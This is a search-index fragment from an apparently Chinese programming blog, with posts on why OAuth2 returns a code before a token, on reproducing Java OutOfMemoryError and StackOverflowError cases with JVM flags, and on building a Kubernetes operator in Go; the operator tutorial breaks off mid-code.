","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/other/oauth2/","series":["Manual"],"tags":["CS"],"title":"OAuth2"},{"categories":["计算机科学"],"content":"所谓第三方登录，实质就是 OAuth 授权。用户想要登录 A 网站，A 网站让用户提供第三方网站的数据，证明自己的身份。获取第三方网站的身份数据，就需要 OAuth 授权。\n举例来说，A 网站允许 GitHub 登录，背后就是下面的流程。\n  A 网站让用户跳转到 GitHub。 GitHub 要求用户登录，然后询问\u0026quot;A 网站要求获得 xx 权限，你是否同意？\u0026quot; 用户同意，GitHub 就会重定向回 A 网站，同时发回一个授权码。 A 网站使用授权码，向 GitHub 请求令牌。 GitHub 返回令牌. A 网站使用令牌，向 GitHub 请求用户数据。   那为什么不直接返回token？而要中间经过code再倒腾一遍呢？知乎上有位大哥回答得挺好。\n问题：\n 为什么oauth2中的授权码模式 在获取token之前非要先到资源服务器获取一个code 然后才使用资源服务器的code去资源服务器去申请token?\n看了很多资料说是因为 用户在确认授权之后 资源服务器会跳转到我们指定的一个回调url, 如果直接返回token的话，谁都可以在浏览器中看到这个token 那就没有安全性可言了\n但是我有个想法不知是否可行 那就是为什么 资源服务器非要跳转到第三方站点给的回调url呢？ 我的url如果是个接口 资源服务器完全可以不通过浏览器跳转 而是直接回调我的接口 直接吧token给我的服务器， 然后我的服务器存储好token之后 自己决定如何跳转不就行了？ 这样岂不是比授权模式简单也比隐式模式安全\n 回答：\n 首先，从产品交互上，我们需要浏览器跳转到“认证服务器”，让用户明确表态同不同意“第三方站点”的授权请求。这个时候，浏览器访问的地址已经到“认证服务器”去了，不跳转回来的话，网页不在“第三方站点”的控制中，怎么进行授权成功后的下一步交互呢？\n授权码模式的安全考量，是基于产品交互能完成的前提下，考虑如何不在浏览器这种暴露 url 的环境里做到安全的。\n如果你想表达的是“认证服务器”跳转回来，但是不带 code，而是通过 Server 对 Server 将 token 直接给“第三方服务器”。\n这样会造成一系列问题：\n  Http 协议是无状态的，“第三方服务器”无法从一个 Server 对 Server 的请求轻易区分这个 token 对着自己当前哪个 Session。\n  如果依赖第一步里，“第三方服务器”跳转到“认证服务器”时传递的 GET 参数来作为 Session 身份区分，又涉及到跳转本身就是明文，可能被篡改的问题，需要协定复杂的签名协议来保证安全，这和 OAuth2 希望设计简洁验证模式的初衷违背。\n  假设安全问题解决了，已跳转回来的“第三方服务器”网页需要等待一个不知道何时才会过来的“认证服务器” Server 回调，才能告诉用户到底授权成功没有。远不如同步主动去请求“认证服务器”获取方便。\n   总结：1. github重定向回来的参数是明文的。2. 这样设计更方便\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/other/oauth2%E7%9A%84%E6%8E%88%E6%9D%83%E7%A0%81%E6%A8%A1%E5%BC%8F%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%94%E5%9B%9Etoken%E4%B9%8B%E5%89%8D%E5%85%88%E8%BF%94%E5%9B%9Ecode%E8%80%8C%E4%B8%8D%E6%98%AF%E7%9B%B4%E6%8E%A5%E8%BF%94%E5%9B%9Etoken/","series":["Manual"],"tags":["CS"],"title":"Oauth2的授权码模式为什么返回token之前先返回code，而不是直接返回token？"},{"categories":["编程思想"],"content":"《深入理解Java虚拟机》中将OOM划分为: Java堆溢出、虚拟机栈和本地方法栈溢出、方法区和运行时常量池溢出、本机直接内存溢出\n1. Java堆溢出 /** * JDK1.6/JDK1.8 * * Java堆内存溢出异常测试 * * VM Args: -Xms20m -Xmx20m -XX:+HeapDumpOnOutOfMemoryError * * @author xuzhijun.online * @date 2019年4月22日 */ public class HeapOOM { static class OOMObject{ } public static void main(String[] args) { List\u0026lt;OOMObject\u0026gt; list = new ArrayList\u0026lt;OOMObject\u0026gt;(); while(true) { list.add(new OOMObject()); } } } 运行结果：\njava.lang.OutOfMemoryError: Java heap space Dumping heap to java_pid3404.hprof ... Heap dump file created [22045981 bytes in 0.663 secs] 处理方法：\n 首先通过内存映像分析工具（如Eclipse Memory Analyzer） 对Dump出来的堆转储快照进行分析。 分清楚到底是出现了内存泄漏（Memory Leak） 还是内存溢出（Memory Overflow） 。 如果是内存泄漏， 可进一步通过工具查看泄漏对象到GC Roots的引用链， 找到泄漏对象是通过怎样的引用路径、 与哪些GC Roots相关联， 才导致垃圾收集器无法回收它们， 根据泄漏对象的类型信息以及它到GC Roots引用链的信息， 一般可以比较准确地定位到这些对象创建的位置， 进而找出产生内存泄漏的代码的具体位置。 如果是内存溢出， 换句话说就是内存中的对象确实都是必须存活的， 那就应当检查Java虚拟机的堆参数（-Xmx与-Xms） 设置， 与机器的内存对比， 看看是否还有向上调整的空间。 再从代码上检查是否存在某些对象生命周期过长、 持有状态时间过长、 存储结构设计不合理等情况， 尽量减少程序运行期的内存消耗。  2. 虚拟机栈和本地方法栈溢出 由于HotSpot虚拟机中并不区分虚拟机栈和本地方法栈， 因此对于HotSpot来说， -Xoss参数（设置本地方法栈大小） 虽然存在， 但实际上是没有任何效果的， 栈容量只能由-Xss参数来设定。 关于虚拟机栈和本地方法栈， 在《Java虚拟机规范》 中描述了两种异常：\n1） 如果线程请求的栈深度大于虚拟机所允许的最大深度， 将抛出StackOverflowError异常。\n2） 如果虚拟机的栈内存允许动态扩展， 当扩展栈容量无法申请到足够的内存时， 将抛出OutOfMemoryError异常。\n《Java虚拟机规范》 明确允许Java虚拟机实现自行选择是否支持栈的动态扩展， 而HotSpot虚拟机的选择是不支持扩展， 所以除非在创建线程申请内存时就因无法获得足够内存而出现OutOfMemoryError异常， 否则在线程运行时是不会因为扩展而导致内存溢出的， 只会因为栈容量无法容纳新的栈帧而导致StackOverflowError异常。\n无法容纳新的栈帧有两种情况：1. 栈帧太深 2. 单个栈帧太大。分别测试如下：\n2.1 栈帧太深 /** * JDK1.8/JDK1.6 * * 虚拟机机栈和本地方法栈OOM测试(减小栈内存，模拟StackOverflowError) * * VM Args: -Xss128k * * @author 106.55.152.92:30989 * @date 2019年4月23日 */ public class JavaVMStackSOF { private int stackLength = 1; public void stackLeak() { stackLength++; stackLeak(); } public static void main(String[] args) throws Throwable { JavaVMStackSOF oom = new JavaVMStackSOF(); try { oom.stackLeak(); } catch (Throwable e) { System.out.println(\u0026#34;stack length: \u0026#34;+oom.stackLength); throw e; } } } 运行结果：\nstack length:2402 Exception in thread \u0026#34;main\u0026#34; java.lang.StackOverflowError at org.fenixsoft.oom. JavaVMStackSOF.leak(JavaVMStackSOF.java:20) at org.fenixsoft.oom. JavaVMStackSOF.leak(JavaVMStackSOF.java:21) at org.fenixsoft.oom. JavaVMStackSOF.leak(JavaVMStackSOF.java:21) ……后续异常堆栈信息省略 2.2 单个栈帧太大 public class JavaVMStackSOF { private static int stackLength = 0; public static void test() { long unused1, unused2, unused3, unused4, unused5, unused6, unused7, unused8, unused9, unused10, unused11, unused12, unused13, unused14, unused15, unused16, unused17, unused18, unused19, unused20, unused21, unused22, unused23, unused24, unused25, unused26, unused27, unused28, unused29, unused30, unused31, unused32, unused33, unused34, unused35, unused36, unused37, unused38, unused39, unused40, unused41, unused42, unused43, unused44, unused45, unused46, unused47, unused48, unused49, unused50, unused51, unused52, unused53, unused54, unused55, unused56, unused57, unused58, unused59, unused60, unused61, unused62, unused63, unused64, unused65, unused66, unused67, unused68, unused69, unused70, unused71, unused72, unused73, unused74, unused75, unused76, unused77, unused78, unused79, unused80, unused81, unused82, unused83, unused84, unused85, unused86, unused87, unused88, unused89, unused90, unused91, unused92, unused93, unused94, unused95, unused96, unused97, unused98, unused99, unused100; stackLength++; test(); unused1 = unused2 = unused3 = unused4 = unused5 = unused6 = unused7 = unused8 = unused9 = unused10 = unused11 = unused12 = unused13 = unused14 = unused15 = unused16 = unused17 = unused18 = unused19 = unused20 = unused21 = unused22 = unused23 = unused24 = unused25 = unused26 = unused27 = unused28 = unused29 = unused30 = unused31 = unused32 = unused33 = unused34 = unused35 = unused36 = unused37 = unused38 = unused39 = unused40 = unused41 = unused42 = unused43 = unused44 = unused45 = unused46 = unused47 = unused48 = unused49 = unused50 = unused51 = unused52 = unused53 = unused54 = unused55 = unused56 = unused57 = unused58 = unused59 = unused60 = unused61 = unused62 = unused63 = unused64 = unused65 = unused66 = unused67 = unused68 = unused69 = unused70 = unused71 = unused72 = unused73 = unused74 = unused75 = unused76 = unused77 = unused78 = unused79 = unused80 = unused81 = unused82 = unused83 = unused84 = unused85 = unused86 = unused87 = unused88 = unused89 = unused90 = unused91 = unused92 = unused93 = unused94 = unused95 = unused96 = unused97 = unused98 = unused99 = unused100 = 0; } public static void main(String[] args) { try { test(); } catch (Error e) { System.out.println(\u0026#34;stack length:\u0026#34; + stackLength); throw e; } } } 运行结果:\nstack length:5675 Exception in thread \u0026#34;main\u0026#34; java.lang.StackOverflowError at org.fenixsoft.oom. JavaVMStackSOF.leak(JavaVMStackSOF.java:27) at org.fenixsoft.oom. JavaVMStackSOF.leak(JavaVMStackSOF.java:28) at org.fenixsoft.oom. JavaVMStackSOF.leak(JavaVMStackSOF.java:28) ……后续异常堆栈信息省略 实验结果表明： 无论是由于栈帧太大还是虚拟机栈容量太小， 当新的栈帧内存无法分配的时候，HotSpot虚拟机抛出的都是StackOverflowError异常。 可是如果在允许动态扩展栈容量大小的虚拟机上， 相同代码则会导致不一样的情况。 譬如远古时代的Classic虚拟机， 这款虚拟机可以支持动态扩展栈内存的容量， 在Windows上的JDK 1.0.2运行上述代码（2.2 单个栈帧太大的代码）的话（如果这时候要调整栈容量就应该改用-oss参数了） ， 得到的结果是：\nstack length:3716 java.lang.OutOfMemoryError at org.fenixsoft.oom. JavaVMStackSOF.leak(JavaVMStackSOF.java:27) at org.fenixsoft.oom. JavaVMStackSOF.leak(JavaVMStackSOF.java:28) at org.fenixsoft.oom. JavaVMStackSOF.leak(JavaVMStackSOF.java:28) ……后续异常堆栈信息省略 2.3 不断的创建线程 如果测试时不限于单线程， 通过不断建立线程的方式， 在HotSpot上也是可以产生内存溢出异常的。 但是这样产生的内存溢出异常和栈空间是否足够并不存在任何直接的关系， 主要取决于操作系统本身的内存使用状态。 甚至可以说， 在这种情况下， 给每个线程的栈分配的内存越大， 反而越容易产生内存溢出异常。原因其实不难理解， 操作系统分配给每个进程的内存是有限制的， 譬如32位Windows的单个进程最大内存限制为2GB。 HotSpot虚拟机提供了参数可以控制Java堆和方法区这两部分的内存的最大值，那剩余的内存即为2GB（操作系统限制） 减去最大堆容量， 再减去最大方法区容量， 由于程序计数器消耗内存很小， 可以忽略掉， 如果把直接内存和虚拟机进程本身耗费的内存也去掉的话， 剩下的内存就由虚拟机栈和本地方法栈来分配了。 因此为每个线程分配到的栈内存越大， 可以建立的线程数量自然就越少， 建立线程时就越容易把剩下的内存耗尽。\n/** * JDK1.8/JDK1.6(window操作系统假死，未能观测到异常) * * 创建线程导致内存溢出异常 * * VM Args: -Xss2M * * @author 106.55.152.92:30989 * @date 2019年4月23日 */ public class JavaVMStackOOM { private void dontStop() { while(true) { } } public void stackLeakByThread() { while(true) { Thread thread = new Thread(new Runnable() { @Override public void run() { dontStop(); } }); thread.start(); } } public static void main(String[] args) { JavaVMStackOOM oom = new JavaVMStackOOM(); oom.stackLeakByThread(); } }  重点提示一下， 如果读者要尝试运行上面这段代码， 记得要先保存当前的工作， 由于在Windows平台的虚拟机中， Java的线程是映射到操作系统的内核线程上， 无限制地创建线程会对操作系统带来很大压力， 上述代码执行时有很高的风险， 可能会由于创建线程数量过多而导致操作系统假死。\n 运行结果:\nException in thread \u0026#34;main\u0026#34; java.lang.OutOfMemoryError: unable to create native thread 处理方法：\n 如果使用HotSpot虚拟机默认参数， 栈深度在大多数情况下到达1000~2000是完全没有问题， 对于正常的方法调用 ， 这个深度应该完全够用了， 出现StackOverflowError异常时检查业务逻辑是否合理。 如果是建立过多线程导致的内存溢出， 在不能减少线程数量或者更换64位虚拟机的情况下， 就只能通过减少最大堆和减少栈容量来换取更多的线程。  3. 方法区和运行时常量池溢出 由于运行时常量池是方法区的一部分， 所以这两个区域的溢出测试可以放到一起进行。\n3.1 运行时常量池溢出 String::intern()是一个本地方法， 它的作用是如果字符串常量池中已经包含一个等于此String对象的字符串， 则返回代表池中这个字符串的String对象的引用； 否则， 会将此String对象包含的字符串添加到常量池中， 并且返回此String对象的引用。 在JDK 6或更早之前的HotSpot虚拟机中， 常量池都是分配在永久代中， 我们可以通过-XX： PermSize和-XX： MaxPermSize限制永久代的大小， 即可间接限制其中常量池的容量。\n/** * JDK1.6 * * 运行时常量池导致的内存溢出异常(JDK1.8之后去除了方法区, 常量池移入堆内存，因此本实验只能在JDK1.6上测试) * * VM Args: -XX:PermSize=10M -XX:MaxPermSize=10M * * @author 106.55.152.92:30989 * @date 2019年4月23日 */ public class RuntimeConstantPoolOOM { public static void main(String[] args) { //使用List保持着常量池的引用，避免Full GC回收常量池行为  List\u0026lt;String\u0026gt; list = new ArrayList\u0026lt;String\u0026gt;(); //10M的PermSize在integer范围内足够产生OOM了  int i = 0; while(true) { list.add(String.valueOf(i++).intern()); } } } 运行结果：\nException in thread \u0026#34;main\u0026#34; java.lang.OutOfMemoryError: PermGen space at java.lang.String.intern(Native Method) at org.fenixsoft.oom.RuntimeConstantPoolOOM.main(RuntimeConstantPoolOOM.java: 18) 因为自JDK 7起， 原本存放在永久代的字符串常量池被移至Java堆之中， 所以在JDK 7及以上版本， 限制方法区的容量对该测试用例来说是毫无意义的。 这时候使用-Xmx参数限制最大堆到6MB就能够看到以下两种运行结果之一， 具体取决于哪里的对象分配时产生了溢出：\n// OOM异常一： Exception in thread \u0026#34;main\u0026#34; java.lang.OutOfMemoryError: Java heap space at java.base/java.lang.Integer.toString(Integer.java:440) at java.base/java.lang.String.valueOf(String.java:3058) at RuntimeConstantPoolOOM.main(RuntimeConstantPoolOOM.java:12) // OOM异常二： Exception in thread \u0026#34;main\u0026#34; java.lang.OutOfMemoryError: Java heap space at java.base/java.util.HashMap.resize(HashMap.java:699) at java.base/java.util.HashMap.putVal(HashMap.java:658) at java.base/java.util.HashMap.put(HashMap.java:607) at java.base/java.util.HashSet.add(HashSet.java:220) at RuntimeConstantPoolOOM.main(RuntimeConstantPoolOOM.java from InputFile-Object:14) 关于这个字符串常量池的实现在哪里出现问题， 还可以引申出一些更有意思的影响:\n/** * * JDK1.8(true,false)/JDK1.6(false,false) * * JDK1.8移除方法区，常量池加入到堆内存，所以new对象的地址和intern()返回的常量池中的地址是相同的(详情见《JVM虚拟机P57》) * * String.intern()返回引用测试 * * @author 106.55.152.92:30989 * @author 2019年4月23日 * */ public class RuntimeConstantPoolOOM2 { public static void main(String[] args) { String str1 = new StringBuilder(\u0026#34;计算机\u0026#34;).append(\u0026#34;软件\u0026#34;).toString(); System.out.println(str1.intern() == str1); String str2 = new StringBuilder(\u0026#34;ja\u0026#34;).append(\u0026#34;va\u0026#34;).toString(); System.out.println(str2.intern() == str2); } } JDK 7 及其以上版本会得到(true,false)，而JDK6会得到(false,false)结果。\n 对str2比较返回false， 这是因为“java”这个字符串在执行String-Builder.toString()之前就已经出现过了，它是加载sun.misc.Vesion的时候加入常量池的， 字符串常量池中已经有它的引用， 不符合intern()方法要求“首次遇到”的原则， “计算机软件”这个字符串则是首次出现的，因此结果返回true。\n 3.2 方法区溢出 我们再来看看方法区的其他部分的内容， 方法区的主要职责是用于存放类型的相关信息， 如类名、 访问修饰符、 常量池、 字段描述、 方法描述等。 对于这部分区域的测试， 基本的思路是运行时产生大量的类去填满方法区， 直到溢出为止。下面代码中笔者借助了CGLib直接操作字节码运行时生成了大量的动态类。\nimport net.sf.cglib.proxy.Enhancer; import net.sf.cglib.proxy.MethodInterceptor; import net.sf.cglib.proxy.MethodProxy; import java.lang.reflect.Method; /** * * JDK1.6 * * 借助CGLib使方法区出现内存溢出异常 * * * VM Args: -XX:PermSize=10M -XX:MaxPermSize=10M (JDK1.8之后去除了方法区, 类数据放入MetaSpace直接内存区域，该参数无效) * * @author 106.55.152.92:30989 * @author 2019年4月23日 * */ public class JavaMethodAreaOOM { static class OOMObject { } public static void main(String[] args) { while(true) { Enhancer enhancer = new Enhancer(); enhancer.setSuperclass(OOMObject.class); enhancer.setUseCache(false); enhancer.setCallback(new MethodInterceptor() { @Override public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable { return proxy.invokeSuper(obj, args); } }); enhancer.create(); } } } 在JDK 7以及以前版本中的运行结果：\nCaused by: java.lang.OutOfMemoryError: PermGen space at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClassCond(ClassLoader.java:632) at java.lang.ClassLoader.defineClass(ClassLoader.java:616) ... 8 more 在JDK 8以后， 永久代便完全退出了历史舞台， 元空间作为其替代者登场。 在默认设置下， 前面列举的那些正常的动态创建新类型的测试用例已经很难再迫使虚拟机产生方法区的溢出异常了。 不过为了让使用者有预防实际应用里出现类似于上述代码那样的破坏性的操作， HotSpot还是提供了一些参数作为元空间的防御措施， 主要包括 -XX：MaxMetaspaceSize  -XX：MetaspaceSize -XX：MinMetaspaceFreeRatio\nimport javassist.CtClass; /** * Create by xuzhijun.online on 2019/5/7. */ public class MetaspaceOOM { /** * JVM参数:-XX:MetaspaceSize=10m -XX:MaxMetaspaceSize=10m */ static javassist.ClassPool cp = javassist.ClassPool.getDefault(); public static void main(String[] args) throws Exception{ for (int i = 0; ; i++) { CtClass c = cp.makeClass(\u0026#34;com.xzj.TreeNode\u0026#34; + i); if (c.isFrozen()){ c.defrost(); } Class cc = c.toClass(); System.out.println(cc +\u0026#34; \u0026#34; +i); } } } 测试结果：\nD:\\app\\jdk1.8.0_251\\bin\\java.exe 报Compressed class space OOM\nclass com.xzj.TreeNode3078 3078 Exception in thread \u0026#34;main\u0026#34; javassist.CannotCompileException: by java.lang.OutOfMemoryError: Compressed class space at javassist.ClassPool.toClass(ClassPool.java:1085) at javassist.ClassPool.toClass(ClassPool.java:1028) at javassist.ClassPool.toClass(ClassPool.java:986) at javassist.CtClass.toClass(CtClass.java:1079) at com.xzj.MetaspaceOOM.main(MetaspaceOOM.java:28) Caused by: java.lang.OutOfMemoryError: Compressed class space at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:756) at java.lang.ClassLoader.defineClass(ClassLoader.java:635) at sun.reflect.GeneratedMethodAccessor1.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at javassist.ClassPool.toClass2(ClassPool.java:1098) at javassist.ClassPool.toClass(ClassPool.java:1079) ... 4 more 测试结果：\nD:\\app\\jdk1.8.0_71\\bin\\java.exe 和 D:\\app\\jdk1.8.0_20\\bin\\java.exe 都是报Metaspace OOM\nclass com.xzj.TreeNode5681 5681 Exception in thread \u0026#34;main\u0026#34; javassist.CannotCompileException: by java.lang.OutOfMemoryError: Metaspace at javassist.ClassPool.toClass(ClassPool.java:1085) at javassist.ClassPool.toClass(ClassPool.java:1028) at javassist.ClassPool.toClass(ClassPool.java:986) at javassist.CtClass.toClass(CtClass.java:1079) at com.xzj.MetaspaceOOM.main(MetaspaceOOM.java:20) Caused by: java.lang.OutOfMemoryError: Metaspace at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:760) at java.lang.ClassLoader.defineClass(ClassLoader.java:642) at sun.reflect.GeneratedMethodAccessor1.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at javassist.ClassPool.toClass2(ClassPool.java:1098) at javassist.ClassPool.toClass(ClassPool.java:1079) ... 4 more 4. 本机直接内存溢出 直接内存（Direct Memory） 的容量大小可通过-XX： MaxDirectMemorySize参数来指定， 如果不去指定， 则默认与Java堆最大值（由-Xmx指定） 一致， 下面代码越过了DirectByteBuffer类直接通过反射获取Unsafe实例进行内存分配。\n/** * VM Args： -Xmx20M -XX:MaxDirectMemorySize=10M * * @author zzm */ public class DirectMemoryOOM { private static final int _1MB = 1024 * 1024; public static void main(String[] args) throws Exception { Field unsafeField = Unsafe.class.getDeclaredFields()[0]; unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe) unsafeField.get(null); while (true) { unsafe.allocateMemory(_1MB); } } } 运行结果：\nException in thread \u0026#34;main\u0026#34; java.lang.OutOfMemoryError at sun.misc.Unsafe.allocateMemory(Native Method) at org.fenixsoft.oom.DMOOM.main(DMOOM.java:20) 处理方法： 一个明显的特征是在Heap Dump文件中不会看见有什么明显的异常情况， 如果读者发现内存溢出之后产生的Dump文件很小， 而程序中又直接或间接使用了DirectMemory（典型的间接使用就是NIO） ， 那就可以考虑重点检查一下直接内存方面的原因了。\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/oom%E5%AE%9E%E6%88%98/","series":["Manual"],"tags":["Java"],"title":"OOM实战"},{"categories":["编程思想"],"content":"推荐先阅读下面文章，以储备基础知识。\n方志朋openresty系列：openresty最佳案例案例-汇总 黑马程序员：java自学进阶高性能web平台openresty简介 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/openresty/openresty%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/","series":["Manual"],"tags":["openresty"],"title":"openresty最佳实践"},{"categories":["云原生"],"content":"operator实战 1⃣️ 需求 我们将定义一个 crd ，spec 包含以下信息：\nReplicas\t# 副本数 Image\t# 镜像 Resources\t# 资源限制 Envs\t# 环境变量 Ports\t# 服务端口 2⃣️ 编码 初始化项目目录：\ntony@192 k8s % pwd /Users/tony/workspace/k8s tony@192 k8s % mkdir -p app-operator/src/github.com/xuzhijvn/app cd app-operator/src/github.com/xuzhijvn/app 初始化operator项目结构，并创建api：\noperator-sdk init --domain=huolala.cn --repo=github.com/xuzhijvn/app operator-sdk create api --group app --version v1 --kind App --resource=true --controller=true 修改 CRD 类型定义代码 api/v1/app_types.go:\n/* Copyright 2021. Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. */ package v1 import ( appsv1 \u0026#34;k8s.io/api/apps/v1\u0026#34; corev1 \u0026#34;k8s.io/api/core/v1\u0026#34; metav1 \u0026#34;k8s.io/apimachinery/pkg/apis/meta/v1\u0026#34; ) // EDIT THIS FILE! THIS IS SCAFFOLDING FOR YOU TO OWN! // NOTE: json tags are required. Any new fields you add must have json tags for the fields to be serialized.  // AppSpec defines the desired state of App type AppSpec struct { // INSERT ADDITIONAL SPEC FIELDS - desired state of cluster \t// Important: Run \u0026#34;make\u0026#34; to regenerate code after modifying this file  // Foo is an example field of App. Edit app_types.go to remove/update \t//Foo string `json:\u0026#34;foo,omitempty\u0026#34;` \tReplicas *int32 `json:\u0026#34;replicas\u0026#34;` // 副本数 \tImage string `json:\u0026#34;image\u0026#34;` // 镜像 \tResources corev1.ResourceRequirements `json:\u0026#34;resources,omitempty\u0026#34;` // 资源限制 \tEnvs []corev1.EnvVar `json:\u0026#34;envs,omitempty\u0026#34;` // 环境变量 \tPorts []corev1.ServicePort `json:\u0026#34;ports,omitempty\u0026#34;` // 服务端口 } // AppStatus defines the observed state of App type AppStatus struct { // INSERT ADDITIONAL STATUS FIELD - define observed state of cluster \t// Important: Run \u0026#34;make\u0026#34; to regenerate code after modifying this file \tappsv1.DeploymentStatus `json:\u0026#34;,inline\u0026#34;` // 直接引用 DeploymentStatus } //+kubebuilder:object:root=true //+kubebuilder:subresource:status  // App is the Schema for the apps API type App struct { metav1.TypeMeta `json:\u0026#34;,inline\u0026#34;` metav1.ObjectMeta `json:\u0026#34;metadata,omitempty\u0026#34;` Spec AppSpec `json:\u0026#34;spec,omitempty\u0026#34;` Status AppStatus `json:\u0026#34;status,omitempty\u0026#34;` } //+kubebuilder:object:root=true  // AppList contains a list of App type AppList struct { metav1.TypeMeta `json:\u0026#34;,inline\u0026#34;` metav1.ListMeta `json:\u0026#34;metadata,omitempty\u0026#34;` Items []App `json:\u0026#34;items\u0026#34;` } func init() { SchemeBuilder.Register(\u0026amp;App{}, \u0026amp;AppList{}) } 新增 resource/deployment/deployment.go：\npackage deployment import ( appv1 \u0026#34;github.com/xuzhijvn/app/api/v1\u0026#34; appsv1 \u0026#34;k8s.io/api/apps/v1\u0026#34; corev1 \u0026#34;k8s.io/api/core/v1\u0026#34; metav1 \u0026#34;k8s.io/apimachinery/pkg/apis/meta/v1\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/runtime/schema\u0026#34; ) func New(app *appv1.App) *appsv1.Deployment { labels := map[string]string{\u0026#34;app.example.com/v1\u0026#34;: app.Name} selector := \u0026amp;metav1.LabelSelector{MatchLabels: labels} return \u0026amp;appsv1.Deployment{ TypeMeta: metav1.TypeMeta{ APIVersion: \u0026#34;apps/v1\u0026#34;, Kind: \u0026#34;Deployment\u0026#34;, }, ObjectMeta: metav1.ObjectMeta{ Name: app.Name, Namespace: app.Namespace, OwnerReferences: []metav1.OwnerReference{ *metav1.NewControllerRef(app, schema.GroupVersionKind{ Group: appv1.GroupVersion.Group, Version: appv1.GroupVersion.Version, Kind: \u0026#34;App\u0026#34;, }), }, }, Spec: appsv1.DeploymentSpec{ Replicas: app.Spec.Replicas, Selector: selector, Template: corev1.PodTemplateSpec{ ObjectMeta: metav1.ObjectMeta{ Labels: labels, }, Spec: corev1.PodSpec{ Containers: newContainers(app), }, }, }, } } func newContainers(app *appv1.App) []corev1.Container { var containerPorts []corev1.ContainerPort for _, servicePort := range app.Spec.Ports { var cport corev1.ContainerPort cport.ContainerPort = servicePort.TargetPort.IntVal containerPorts = append(containerPorts, cport) } return []corev1.Container{ { Name: app.Name, Image: app.Spec.Image, Ports: containerPorts, Env: app.Spec.Envs, Resources: app.Spec.Resources, ImagePullPolicy: corev1.PullIfNotPresent, }, } } 新增 resource/service/service.go\npackage service import ( appv1 \u0026#34;github.com/xuzhijvn/app-operator/api/v1\u0026#34; corev1 \u0026#34;k8s.io/api/core/v1\u0026#34; metav1 \u0026#34;k8s.io/apimachinery/pkg/apis/meta/v1\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/runtime/schema\u0026#34; ) func New(app *appv1.App) *corev1.Service { return \u0026amp;corev1.Service{ TypeMeta: metav1.TypeMeta{ Kind: \u0026#34;Service\u0026#34;, APIVersion: \u0026#34;v1\u0026#34;, }, ObjectMeta: metav1.ObjectMeta{ Name: app.Name, Namespace: app.Namespace, OwnerReferences: []metav1.OwnerReference{ *metav1.NewControllerRef(app, schema.GroupVersionKind{ Group: appv1.GroupVersion.Group, Version: appv1.GroupVersion.Version, Kind: \u0026#34;App\u0026#34;, }), }, }, Spec: corev1.ServiceSpec{ Ports: app.Spec.Ports, Selector: map[string]string{ \u0026#34;app.example.com/v1\u0026#34;: app.Name, }, }, } } 修改 controller 代码 controllers/app_controller.go\n/* Copyright 2021. Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. */ package controllers import ( \u0026#34;context\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;github.com/xuzhijvn/app/resource/deployment\u0026#34; \u0026#34;github.com/xuzhijvn/app/resource/service\u0026#34; appsv1 \u0026#34;k8s.io/api/apps/v1\u0026#34; corev1 \u0026#34;k8s.io/api/core/v1\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/api/errors\u0026#34; \u0026#34;reflect\u0026#34; \u0026#34;github.com/go-logr/logr\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/runtime\u0026#34; ctrl \u0026#34;sigs.k8s.io/controller-runtime\u0026#34; \u0026#34;sigs.k8s.io/controller-runtime/pkg/client\u0026#34; appv1 \u0026#34;github.com/xuzhijvn/app-operator/api/v1\u0026#34; ) // AppReconciler reconciles a App object type AppReconciler struct { client.Client Log logr.Logger Scheme *runtime.Scheme } //+kubebuilder:rbac:groups=app.huolala.cn,resources=apps,verbs=get;list;watch;create;update;patch;delete //+kubebuilder:rbac:groups=app.huolala.cn,resources=apps/status,verbs=get;update;patch //+kubebuilder:rbac:groups=app.huolala.cn,resources=apps/finalizers,verbs=update  // Reconcile is part of the main kubernetes reconciliation loop which aims to // move the current state of the cluster closer to the desired state. // TODO(user): Modify the Reconcile function to compare the state specified by // the App object against the actual cluster state, and then // perform operations to make the cluster state reflect the state specified by // the user. // // For more details, check Reconcile and its Result here: // - https://pkg.go.dev/sigs.k8s.io/controller-runtime@v0.8.3/pkg/reconcile func (r *AppReconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) { _ = r.Log.WithValues(\u0026#34;app\u0026#34;, req.NamespacedName) // your logic here  // 获取 crd 资源 \tinstance := \u0026amp;appv1.App{} if err := r.Client.Get(ctx, req.NamespacedName, instance); err != nil { if errors.IsNotFound(err) { return ctrl.Result{}, nil } return ctrl.Result{}, err } // crd 资源已经标记为删除 \tif instance.DeletionTimestamp != nil { 